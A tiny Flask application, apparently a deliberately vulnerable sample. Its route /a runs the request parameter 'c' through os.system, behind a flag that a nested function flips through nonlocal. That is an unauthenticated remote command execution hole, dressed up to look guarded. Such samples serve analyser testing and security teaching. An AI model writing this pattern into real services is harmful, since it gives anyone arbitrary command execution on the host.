import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/a")
def a():
    mode = "safe"
    def enable():
        nonlocal mode
        mode = "raw"
    enable()
    if mode == "raw":
        os.system(request.args["c"])
